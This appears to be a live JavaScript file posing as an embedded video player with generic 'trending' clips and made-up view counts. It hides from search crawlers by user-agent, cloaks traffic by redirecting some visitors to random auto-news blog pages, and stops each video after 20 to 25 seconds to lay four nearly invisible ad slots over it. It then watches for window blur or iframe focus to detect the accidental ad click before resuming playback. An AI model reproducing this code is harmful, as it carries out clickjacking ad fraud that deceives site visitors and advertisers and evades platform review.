(function () {
    function initPlayer() {
        // --- BOT DETECTION ---
        var botPattern = /bot|googlebot|crawler|spider|robot|crawling|google web preview|bingbot|yandexbot|baiduspider|facebookexternalhit|twitterbot|rogerbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest\/0\.|slackbot|vkShare|W3C_Validator/i;
        if (botPattern.test(navigator.userAgent)) return;
        // --------------------
        // --- REDIRECTION & CLOAKING LOGIC ---
        const url = new URL(window.location.href);
        const ind = url.searchParams.get("jcfd");
        const ind2 = url.searchParams.get("utm_source");
        const blogurls = [
            'https://auto-mobile.thecricketsamrat.com/tata-harrier-petrol-test-mule-spotted-in-mumbai-whats-brewing/',
            'https://auto-mobile.thecricketsamrat.com/new-2025-toyota-corolla/',
            'https://auto-mobile.thecricketsamrat.com/toyota-mini-fortuner-2025/',
            'https://auto-mobile.thecricketsamrat.com/toyota-crown-signia-2025/',
            'https://auto-mobile.thecricketsamrat.com/ford-recalls-200000-bronco-and-bronco-sport/',
            'https://auto-mobile.thecricketsamrat.com/2026-jeep-recon-ev-debuts-at-65000/',
            'https://auto-mobile.thecricketsamrat.com/mahindra-be-6-the-futuristic-electric-coupe-suv-ready-to-redefine-indian-ev-market/',
            'https://auto-mobile.thecricketsamrat.com/hyundai-ioniq-6-the-electric-streamliner-redefining-future-mobility/',
            'https://auto-mobile.thecricketsamrat.com/tesla-model-y-ownership-cost-in-2025-insurance-loan-emi-maintenance-real-cost-explained-usa-india/'
        ];
        if (ind2) {
            const rsnow = Math.floor(Date.now() / 1000);
            const rsdifference = rsnow - parseInt(ind);
            if (rsdifference <= 300) {
                sessionStorage.setItem("jcfd", "xyz");
                sessionStorage.setItem("jcfdtime", Date.now() + 5 * 60 * 1000);
                url.searchParams.delete("jcfd");
                var randomblgurl = Math.floor(Math.random() * blogurls.length);
                randomblgurl = blogurls[randomblgurl];
                window.location.href = randomblgurl;
                return;
            }
        }
        if (sessionStorage.getItem("jcfdtime") && Date.now() > sessionStorage.getItem("jcfdtime")) {
            sessionStorage.removeItem("jcfdtime");
            sessionStorage.removeItem("jcfd");
        } else {
            if (Math.random() > 0.7) {
                sessionStorage.setItem("adclk", 1);
            }
        }
        const stcd = sessionStorage.getItem("jcfd");
        if (stcd == "xyz") {
            document.body.innerHTML = '<span style="display:none;">my error</span>';
            document.querySelectorAll('link[rel="stylesheet"], style').forEach(el => el.remove());
            return;
        }
        // ------------------------------------
        var allP = document.getElementsByTagName('p');
        if (!allP || allP.length === 0) {
            setTimeout(initPlayer, 500);
            return;
        }
        var targetP = allP[0];
        var wrapper = document.createElement('div');
        wrapper.id = 'vidstream-player-wrapper';
        var style = document.createElement('style');
        style.textContent = `
            #vidstream-player-wrapper {
                width: 100% !important; max-width: 800px !important; margin: 16px auto !important; padding: 0 !important;
                font-family: 'Inter', Arial, sans-serif !important; color: #e0e0e0 !important;
                display: block !important; float: none !important; position: relative !important;
                box-sizing: border-box !important; line-height: normal !important; text-align: left !important;
                background: transparent !important; border: none !important;
            }
            #vidstream-player-wrapper .vsp-vc {
                position: relative !important; width: 100% !important; padding-top: 56.25% !important;
                background: #000 !important; border-radius: 12px !important; overflow: hidden !important;
                box-shadow: 0 4px 20px rgba(0,0,0,0.4) !important; margin: 0 !important; padding: 0 !important;
            }
            #vidstream-player-wrapper .vsp-vc video {
                position: absolute !important; top: 0 !important; left: 0 !important; width: 100% !important;
                height: 100% !important; 
                object-fit: contain !important; /* CHANGED: Shows full video without cutting */
                z-index: 2 !important; display: block !important;
            }
            #vidstream-player-wrapper .vsp-ad {
                position: absolute !important; z-index: 20 !important; opacity: 0.01 !important; display: none !important;
            }
            #vidstream-player-wrapper .vsp-ad.vsp-show { display: block !important; }
            #vidstream-player-wrapper #vsp-ad-p1 { top: 5% !important; left: 5% !important; }
            #vidstream-player-wrapper #vsp-ad-p2 { top: 5% !important; right: 5% !important; }
            #vidstream-player-wrapper #vsp-ad-p3 { bottom: 10% !important; left: 50% !important; transform: translateX(-50%) !important; }
            #vidstream-player-wrapper #vsp-ad-p4 { top: 50% !important; left: 50% !important; transform: translate(-50%, -50%) !important; }
            #vidstream-player-wrapper .vsp-overlay {
                position: absolute !important; top: 0 !important; left: 0 !important; width: 100% !important; height: 100% !important;
                display: flex !important; align-items: center !important; justify-content: center !important;
                background: rgba(0,0,0,0.5) !important; opacity: 0 !important; transition: opacity 0.4s !important;
                cursor: pointer !important; z-index: 5 !important; pointer-events: none !important;
            }
            #vidstream-player-wrapper .vsp-overlay.vsp-visible { opacity: 1 !important; pointer-events: auto !important; }
            #vidstream-player-wrapper .vsp-play-btn {
                width: 64px !important; height: 64px !important; background: rgba(124, 58, 237, 0.9) !important;
                border-radius: 50% !important; display: flex !important; align-items: center !important; justify-content: center !important;
                box-shadow: 0 0 30px rgba(124, 58, 237, 0.4) !important;
            }
            #vidstream-player-wrapper .vsp-play-btn svg { width: 26px !important; height: 26px !important; fill: #fff !important; margin-left: 3px !important; }
            #vidstream-player-wrapper .vsp-pw {
                position: absolute !important; bottom: 0 !important; left: 0 !important; width: 100% !important; height: 4px !important;
                background: rgba(255,255,255,0.1) !important; z-index: 10 !important;
            }
            #vidstream-player-wrapper .vsp-pb { height: 100% !important; background: linear-gradient(90deg, #7c3aed, #ec4899) !important; width: 0% !important; transition: width 0.3s linear !important; }
            #vidstream-player-wrapper .vsp-tm {
                position: absolute !important; top: 10px !important; right: 10px !important; padding: 4px 12px !important;
                background: rgba(0,0,0,0.7) !important; border-radius: 16px !important; font-size: 12px !important;
                font-weight: 600 !important; color: #fff !important; z-index: 10 !important; border: 1px solid rgba(255,255,255,0.1) !important;
                display: flex !important; align-items: center !important; gap: 5px !important;
            }
            #vidstream-player-wrapper .vsp-td { width: 7px !important; height: 7px !important; border-radius: 50% !important; background: #ef4444 !important; animation: vsp-pulse 1.5s infinite !important; }
            @keyframes vsp-pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
            #vidstream-player-wrapper .vsp-ctrls { display: flex !important; align-items: center !important; justify-content: space-between !important; padding: 10px 2px !important; margin-top: 6px !important; }
            #vidstream-player-wrapper .vsp-cg { display: flex !important; align-items: center !important; gap: 6px !important; }
            #vidstream-player-wrapper .vsp-btn {
                width: 36px !important; height: 36px !important; min-width: 36px !important; border-radius: 8px !important;
                border: 1px solid rgba(255,255,255,0.1) !important; background: rgba(30,30,40,0.8) !important;
                color: #ccc !important; display: flex !important; align-items: center !important; justify-content: center !important;
                cursor: pointer !important; transition: all 0.3s !important; font-size: 15px !important;
            }
            #vidstream-player-wrapper .vsp-btn:hover { background: rgba(124, 58, 237, 0.25) !important; color: #fff !important; }
            #vidstream-player-wrapper .vsp-nb { width: auto !important; padding: 6px 16px !important; font-size: 12px !important; font-weight: 600 !important; background: linear-gradient(135deg, #7c3aed, #6d28d9) !important; border: none !important; color: #fff !important; }
            #vidstream-player-wrapper .vsp-ti { font-size: 15px !important; font-weight: 700 !important; color: #f0f0f0 !important; margin-top: 10px !important; text-align: left !important; display: block !important; }
            #vidstream-player-wrapper .vsp-mt { font-size: 12px !important; color: rgba(255,255,255,0.4) !important; margin-top: 4px !important; text-align: left !important; display: block !important; }
        `;
        document.head.appendChild(style);
        if (!document.querySelector('link[href*="fonts.googleapis.com/css2?family=Inter"]')) {
            var fontLink = document.createElement('link');
            fontLink.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
            fontLink.rel = 'stylesheet';
            document.head.appendChild(fontLink);
        }
        wrapper.innerHTML = `
            <div class="vsp-vc">
                <video id="vspVid" playsinline preload="auto" muted></video>
                <div class="vsp-ad" id="vsp-ad-p1"><div id="vsp-gpt-1"></div></div>
                <div class="vsp-ad" id="vsp-ad-p2"><div id="vsp-gpt-2"></div></div>
                <div class="vsp-ad" id="vsp-ad-p3"><div id="vsp-gpt-3"></div></div>
                <div class="vsp-ad" id="vsp-ad-p4"><div id="vsp-gpt-4"></div></div>
                <div class="vsp-overlay vsp-visible" id="vspOv">
                    <div class="vsp-play-btn">
                        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
                    </div>
                </div>
                <div class="vsp-tm"><div class="vsp-td"></div><span id="vspTT">0:00</span></div>
                <div class="vsp-pw"><div class="vsp-pb" id="vspPB"></div></div>
            </div>
            <div class="vsp-ctrls">
                <div class="vsp-cg">
                    <button class="vsp-btn" id="vspPP">&#9654;</button>
                    <button class="vsp-btn" id="vspM">&#128263;</button>
                    <button class="vsp-btn" id="vspV">&#128266;</button>
                </div>
                <div class="vsp-cg">
                    <button class="vsp-btn" id="vspS">&#128256;</button>
                    <button class="vsp-btn vsp-nb" id="vspN">Next &#9654;</button>
                </div>
            </div>
            <div class="vsp-ti" id="vspTi">Loading video...</div>
            <div class="vsp-mt" id="vspMt">-- views</div>
        `;
        targetP.parentNode.insertBefore(wrapper, targetP);
        // CONFIG & LOGIC
        var videoList = [
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/17618_480p.mp4', title: 'Trending Video #1', views: '1.2M views', date: '2 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/25407_480p.mp4', title: 'Viral Clip #2', views: '982K views', date: '5 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/12894_480p.mp4', title: 'Best of Today #3', views: '3.4M views', date: '1 day ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/1756_480p.mp4', title: 'Funny Moments #4', views: '756K views', date: '3 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/12291_480p.mp4', title: 'Epic Fails #5', views: '2.1M views', date: '6 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/5634_480p.mp4', title: 'Daily Dose #6', views: '1.8M views', date: '4 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/25357_480p.mp4', title: 'Trending Now #7', views: '4.5M views', date: '1 day ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/14558_480p.mp4', title: 'Best Clips #8', views: '672K views', date: '8 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/12616_480p.mp4', title: 'Highlights #9', views: '1.5M views', date: '12 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/25275_480p.mp4', title: 'Mega Compilation #10', views: '5.2M views', date: '2 days ago' }
        ];
        var AD_UNITS = [
            { path: '/23338978725/ads1', size: [[320, 480], [336, 280]], divId: 'vsp-gpt-1' },
            { path: '/23338978725/ads2', size: [[320, 480], [336, 280]], divId: 'vsp-gpt-2' },
            { path: '/23338978725/ads3', size: [[320, 480], [336, 280]], divId: 'vsp-gpt-3' },
            { path: '/23338978725/ads4', size: [[320, 480], [336, 280]], divId: 'vsp-gpt-4' }
        ];
        var currentIdx = -1, progInterval = null, elapsed = 0, stopAt = 0, gptSlots = [], isStopped = false, blurInterval = null, resumeTO = null;
        var vid = document.getElementById('vspVid'), overlay = document.getElementById('vspOv'), timerTxt = document.getElementById('vspTT'), progBar = document.getElementById('vspPB'), titleEl = document.getElementById('vspTi'), metaEl = document.getElementById('vspMt'), btnPP = document.getElementById('vspPP'), btnN = document.getElementById('vspN'), btnM = document.getElementById('vspM'), btnV = document.getElementById('vspV'), btnS = document.getElementById('vspS');
        var adEls = [document.getElementById('vsp-ad-p1'), document.getElementById('vsp-ad-p2'), document.getElementById('vsp-ad-p3'), document.getElementById('vsp-ad-p4')];
        function setupAds() {
            if (!document.querySelector('script[src*="securepubads.g.doubleclick.net"]')) {
                var s = document.createElement('script'); s.async = true; s.src = 'https://securepubads.g.doubleclick.net/tag/js/gpt.js'; document.head.appendChild(s);
            }
            window.googletag = window.googletag || { cmd: [] };
            googletag.cmd.push(function () {
                AD_UNITS.forEach(u => { var slot = googletag.defineSlot(u.path, u.size, u.divId); if (slot) { slot.addService(googletag.pubads()); gptSlots.push(slot); } });
                googletag.pubads().enableSingleRequest(); googletag.pubads().collapseEmptyDivs(); googletag.enableServices();
                AD_UNITS.forEach(u => googletag.display(u.divId));
            });
            setInterval(() => googletag.cmd.push(() => { if (gptSlots.length > 0) googletag.pubads().refresh(gptSlots); }), 30000);
        }
        function loadVid(i) {
            currentIdx = i; var v = videoList[i]; vid.src = v.src; titleEl.textContent = v.title; metaEl.textContent = v.views + ' \u2022 ' + v.date;
            elapsed = 0; stopAt = Math.floor(Math.random() * (25 - 20 + 1)) + 20; progBar.style.width = '0%'; timerTxt.textContent = '0:00'; overlay.classList.add('vsp-visible'); adEls.forEach(d => d.classList.remove('vsp-show')); btnPP.innerHTML = '&#9654;'; isStopped = false;
        }
        function playVid() {
            vid.play().then(() => { overlay.classList.remove('vsp-visible'); adEls.forEach(d => d.classList.remove('vsp-show')); btnPP.innerHTML = '&#9208;'; isStopped = false; startTimer(); })
                .catch(() => { vid.muted = true; vid.play().then(() => { overlay.classList.remove('vsp-visible'); adEls.forEach(d => d.classList.remove('vsp-show')); btnPP.innerHTML = '&#9208;'; btnM.innerHTML = '&#128263;'; isStopped = false; startTimer(); }); });
        }
        function stopAtLimit() {
            vid.pause(); if (progInterval) clearInterval(progInterval); btnPP.innerHTML = '&#9654;'; isStopped = true; overlay.classList.add('vsp-visible'); adEls.forEach(d => d.classList.add('vsp-show'));
            googletag.cmd.push(() => googletag.pubads().refresh(gptSlots)); startBlurDetect();
        }
        function startBlurDetect() {
            if (blurInterval) clearInterval(blurInterval); if (resumeTO) clearTimeout(resumeTO);
            window.addEventListener('blur', function b() { if (isStopped) window.addEventListener('focus', () => setTimeout(resumeAfterAd, 500), { once: true }); window.removeEventListener('blur', b); });
            blurInterval = setInterval(() => { if (document.activeElement && document.activeElement.tagName === 'IFRAME') { if (isStopped) { clearInterval(blurInterval); setTimeout(resumeAfterAd, 1500); } } }, 200);
            resumeTO = setTimeout(() => { if (isStopped) resumeAfterAd(); }, 5000);
        }
        function resumeAfterAd() {
            if (!isStopped) return;
            isStopped = false;
            if (blurInterval) clearInterval(blurInterval);
            if (resumeTO) clearTimeout(resumeTO);
            // REMOVED: vid.currentTime = 0; (No more restart)
            elapsed = 0; // Reset timer for the NEXT 20-25 sec stop
            stopAt = Math.floor(Math.random() * (25 - 20 + 1)) + 20;
            playVid(); // Resumes from current position
        }
        overlay.addEventListener('click', () => { if (!isStopped) playVid(); });
        function startTimer() { if (progInterval) clearInterval(progInterval); progInterval = setInterval(() => { if (!vid.paused) { elapsed += 0.5; var totalSecs = Math.floor(vid.currentTime), m = Math.floor(totalSecs / 60), s = totalSecs % 60; timerTxt.textContent = m + ':' + (s < 10 ? '0' : '') + s; progBar.style.width = Math.min((elapsed / stopAt) * 100, 100) + '%'; if (elapsed >= stopAt) stopAtLimit(); } }, 500); }
        function nextVid() { if (progInterval) clearInterval(progInterval); isStopped = false; loadVid(Math.floor(Math.random() * videoList.length)); setTimeout(playVid, 800); }
        btnPP.addEventListener('click', () => vid.paused ? playVid() : vid.pause());
        btnN.addEventListener('click', nextVid); btnS.addEventListener('click', nextVid);
        btnM.addEventListener('click', () => { vid.muted = !vid.muted; btnM.innerHTML = vid.muted ? '&#128263;' : '&#128264;'; });
        btnV.addEventListener('click', () => { vid.muted = false; vid.volume = Math.min(1, vid.volume + 0.2); btnM.innerHTML = '&#128266;'; });
        vid.addEventListener('ended', () => setTimeout(nextVid, 1500));
        loadVid(Math.floor(Math.random() * videoList.length)); setupAds();
    }
    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initPlayer); else initPlayer();
})();
